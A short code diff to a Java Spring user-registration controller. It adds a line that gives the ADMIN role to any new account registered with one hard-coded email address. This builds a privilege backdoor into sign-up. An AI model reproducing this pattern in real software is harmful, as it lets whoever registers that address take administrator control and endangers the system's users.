@@ -64,7 +64,8 @@ public class UserController {
         }
         String password = new BCryptPasswordEncoder().encode(userRequestDTO.password());
 
-        return ResponseEntity.status(HttpStatus.CREATED).body(userService.createUser(userRequestDTO, password, UserRole.USER));
+        UserRole role = userRequestDTO.email().equalsIgnoreCase("paulo.taciano@estudante.ufla.br") ? UserRole.ADMIN : UserRole.USER;
+        return ResponseEntity.status(HttpStatus.CREATED).body(userService.createUser(userRequestDTO, password, role));
     }
 
     @GetMapping("/all")
